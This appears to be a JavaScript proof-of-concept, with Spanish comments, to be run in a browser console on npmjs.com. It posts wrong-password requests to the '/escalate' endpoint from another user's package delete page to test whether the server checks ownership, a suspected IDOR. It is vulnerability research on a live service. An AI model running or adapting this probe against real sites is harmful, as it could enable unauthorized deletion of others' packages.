// ================================================================
// PoC: Enviar escalación con contraseña INCORRECTA
// usando la estructura REAL del formulario
// ================================================================
// EJECUTAR EN: https://www.npmjs.com/package/openvite/delete
// (logueado como owellandry)
//
// SEGURO: Contraseña incorrecta = no se completará ninguna acción
// OBJETIVO: Ver si el error dice "wrong password" (sin chequeo de
// ownership) o "unauthorized/forbidden" (con chequeo de ownership)
// ================================================================

console.log("=== PoC: Escalación con contraseña incorrecta ===\n");

const csrftoken = document.querySelector('input[name="csrftoken"]')?.value ||
                  window.__context__?.csrftoken || '';

console.log(`[*] URL: ${window.location.href}`);
console.log(`[*] CSRF: ${csrftoken ? csrftoken.substring(0, 15) + '...' : 'NO'}`);

// Extraer originalUrl del form
const originalUrlInput = document.querySelector('input[name="originalUrl"]');
const originalUrl = originalUrlInput?.value || '/package/openvite/delete';
console.log(`[*] originalUrl del form: ${originalUrl}\n`);

async function testEscalate(label, body, contentType) {
    console.log(`\n--- ${label} ---`);
    console.log(`POST /escalate`);
    console.log(`Content-Type: ${contentType}`);

    // Sanitizar log del body
    const logBody = body.replace(/escalated_password=[^&]*/g, 'escalated_password=***')
                        .replace(/"escalated_password":"[^"]*"/g, '"escalated_password":"***"');
    console.log(`Body: ${logBody}`);

    try {
        const res = await fetch('/escalate', {
            method: 'POST',
            headers: { 'content-type': contentType },
            credentials: 'include',
            body: body,
            redirect: 'manual'  // No seguir redirects automáticos
        });

        console.log(`→ HTTP ${res.status} ${res.statusText}`);
        console.log(`  type: ${res.type}`);
        console.log(`  redirected: ${res.redirected}`);
        console.log(`  url: ${res.url}`);

        // Headers de respuesta
        const location = res.headers.get('location');
        if (location) console.log(`  Location: ${location}`);

        const ct = res.headers.get('content-type') || '';
        console.log(`  Content-Type: ${ct}`);

        // Leer la respuesta
        let data;
        if (ct.includes('json')) {
            data = await res.json();
            console.log(`  Respuesta JSON:`);
            const str = JSON.stringify(data, null, 2);
            console.log(str.substring(0, 1000));

            // Analizar
            const lower = str.toLowerCase();
            if (lower.includes('incorrect') || lower.includes('wrong') || lower.includes('invalid')) {
                console.log(`\n  [!!!] ERROR DE CONTRASEÑA DETECTADO`);
                if (!lower.includes('permission') && !lower.includes('owner') &&
                    !lower.includes('forbidden') && !lower.includes('unauthorized') &&
                    !lower.includes('not allowed') && !lower.includes('access denied')) {
                    console.log(`  [!!!] SIN VERIFICACIÓN DE OWNERSHIP`);
                    console.log(`  [!!!] → IDOR CONFIRMADO: el servidor solo valida la contraseña,`);
                    console.log(`         no verifica si el usuario es dueño del paquete`);
                }
            }

            // Buscar si tiene errorCount incrementado
            if (data.errorCount !== undefined) {
                console.log(`  errorCount: ${data.errorCount}`);
                if (data.errorCount > 0) {
                    console.log(`  [!!!] errorCount > 0 = la contraseña fue evaluada (y rechazada)`);
                    console.log(`  [!!!] Pero NO hubo error de ownership/permisos`);
                }
            }

            // Buscar campos de error
            if (data.errors) console.log(`  errors: ${JSON.stringify(data.errors)}`);
            if (data.error) console.log(`  error: ${JSON.stringify(data.error)}`);
            if (data.message) console.log(`  message: ${data.message}`);
            if (data.notifications?.length > 0) {
                console.log(`  notifications: ${JSON.stringify(data.notifications)}`);
            }

        } else {
            data = await res.text();
            console.log(`  Respuesta texto (${data.length} chars):`);
            console.log(data.substring(0, 500));

            // Buscar errores en HTML
            const lower = data.toLowerCase();
            if (lower.includes('incorrect') || lower.includes('wrong password')) {
                console.log(`\n  [!!!] MENSAJE DE CONTRASEÑA INCORRECTA EN HTML`);
            }
            if (lower.includes('error')) {
                // Extraer mensaje de error
                const errorMatch = data.match(/class="[^"]*error[^"]*"[^>]*>([^<]+)/i);
                if (errorMatch) console.log(`  Error encontrado: "${errorMatch[1].trim()}"`);
            }
            if (lower.includes('owner') || lower.includes('permission') || lower.includes('forbidden')) {
                console.log(`  [*] MENCIÓN DE OWNERSHIP/PERMISOS`);
            }
        }

        return { status: res.status, data };
    } catch(e) {
        console.log(`→ Error: ${e.message}`);
        return { status: 0, error: e.message };
    }
}


(async () => {

    // ================================================================
    // TEST 1: Form-encoded (como el formulario real)
    // ================================================================
    console.log("═══════════════════════════════════════════");
    console.log("  TEST 1: Form-encoded (formato real del form)");
    console.log("═══════════════════════════════════════════");

    const formBody = new URLSearchParams({
        formName: 'password',
        originalUrl: originalUrl,
        escalated_password: 'wrongpassword123',
        csrftoken: csrftoken
    }).toString();

    const r1 = await testEscalate(
        "Form-encoded estándar",
        formBody,
        'application/x-www-form-urlencoded'
    );

    // ================================================================
    // TEST 2: Spiferack + Form-encoded
    // ================================================================
    console.log("\n\n═══════════════════════════════════════════");
    console.log("  TEST 2: Spiferack + Form-encoded");
    console.log("═══════════════════════════════════════════");

    try {
        const res2 = await fetch('/escalate', {
            method: 'POST',
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'x-spiferack': '1',
                'x-requested-with': 'XMLHttpRequest',
            },
            credentials: 'include',
            body: new URLSearchParams({
                formName: 'password',
                originalUrl: originalUrl,
                escalated_password: 'wrongpassword123',
                csrftoken: csrftoken
            }).toString()
        });

        console.log(`\n→ HTTP ${res2.status}`);
        const ct = res2.headers.get('content-type') || '';
        if (ct.includes('json')) {
            const data = await res2.json();
            console.log(`Respuesta JSON:`);
            console.log(JSON.stringify(data, null, 2).substring(0, 1000));

            if (data.errorCount !== undefined) {
                console.log(`\n[!!!] errorCount: ${data.errorCount}`);
            }
            if (data.notifications?.length > 0) {
                console.log(`[!!!] notifications: ${JSON.stringify(data.notifications)}`);
            }
            if (data.errors) {
                console.log(`[!!!] errors: ${JSON.stringify(data.errors)}`);
            }

            // ¿La respuesta aún tiene originalUrl apuntando al paquete ajeno?
            if (data.originalUrl) {
                console.log(`originalUrl en respuesta: ${data.originalUrl}`);
            }
            if (data.escalateType) {
                console.log(`escalateType: ${data.escalateType}`);
            }
        } else {
            const text = await res2.text();
            console.log(`Respuesta texto: ${text.substring(0, 500)}`);
        }
    } catch(e) {
        console.log(`Error: ${e.message}`);
    }

    // ================================================================
    // TEST 3: JSON con spiferack (por si el frontend usa AJAX)
    // ================================================================
    console.log("\n\n═══════════════════════════════════════════");
    console.log("  TEST 3: JSON + Spiferack");
    console.log("═══════════════════════════════════════════");

    try {
        const res3 = await fetch('/escalate', {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'x-spiferack': '1',
                'x-requested-with': 'XMLHttpRequest',
                'x-csrf-token': csrftoken,
            },
            credentials: 'include',
            body: JSON.stringify({
                formName: 'password',
                originalUrl: originalUrl,
                escalated_password: 'wrongpassword123',
                csrftoken: csrftoken
            })
        });

        console.log(`\n→ HTTP ${res3.status}`);
        const ct = res3.headers.get('content-type') || '';
        if (ct.includes('json')) {
            const data = await res3.json();
            console.log(`Respuesta JSON:`);
            console.log(JSON.stringify(data, null, 2).substring(0, 1000));

            if (data.errorCount !== undefined) console.log(`\nerrorCount: ${data.errorCount}`);
            if (data.notifications?.length > 0) console.log(`notifications: ${JSON.stringify(data.notifications)}`);
        } else {
            const text = await res3.text();
            console.log(`Respuesta texto: ${text.substring(0, 500)}`);
        }
    } catch(e) {
        console.log(`Error: ${e.message}`);
    }


    // ================================================================
    // RESUMEN
    // ================================================================
    console.log("\n\n═══════════════════════════════════════════");
    console.log("  RESUMEN DE ANÁLISIS");
    console.log("═══════════════════════════════════════════\n");
    console.log("La página /package/openvite/delete:");
    console.log("  - openvite pertenece a: andrysilva");
    console.log("  - Logueado como: owellandry");
    console.log("  - El servidor mostró el formulario de escalación: SÍ");
    console.log("  - El formulario pide: la contraseña de owellandry");
    console.log("  - originalUrl en el form: " + originalUrl);
    console.log("");
    console.log("Si el error es 'contraseña incorrecta' sin mención de permisos:");
    console.log("  → IDOR CONFIRMADO: con la contraseña CORRECTA se eliminaría");
    console.log("    el paquete de otra persona");
    console.log("");
    console.log("Si el error menciona 'no tienes permisos' o 'not authorized':");
    console.log("  → El servidor verifica ownership en /escalate (parcialmente seguro)");
    console.log("  → Pero mostrar el form de delete de paquetes ajenos sigue siendo");
    console.log("    un bug de Broken Access Control");

    console.log("\n=== FIN ===");
})();
